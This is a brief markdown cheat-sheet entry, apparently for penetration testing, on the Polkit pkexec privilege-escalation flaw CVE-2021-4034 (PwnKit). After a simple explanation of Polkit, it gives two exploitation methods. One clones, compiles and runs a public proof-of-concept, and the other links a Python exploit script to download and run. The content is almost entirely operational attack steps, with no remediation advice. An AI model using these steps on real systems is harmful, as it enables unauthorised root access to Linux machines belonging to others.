### <span style="color:#50FA7B">What is **Polkit**? (CVE-2021-4034) **(Pwnkit)** vulnerability:</span>

**Polkit (PolicyKit)** is like a **security gatekeeper** on Linux systems. It helps control **who can do what**—especially when a normal user tries to do something that normally requires **administrator (root)** permissions.
Think of it like this:
- You ask to do something big (like install software).
- Polkit checks: “Are you allowed to do that?”
- If yes → allowed.
- If not → denied (unless you prove you're root or an admin).

### <span style="color:#50FA7B">`pkexec 0.105 is vulnerable `</span>

## <span style="color:#8BE9FD">Method 1</span>
```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

## <span style="color:#8BE9FD">Method 2</span>
```
https://raw.githubusercontent.com/Almorabea/pkexec-exploit/refs/heads/main/CVE-2021-4034.py
```
 run this code using python 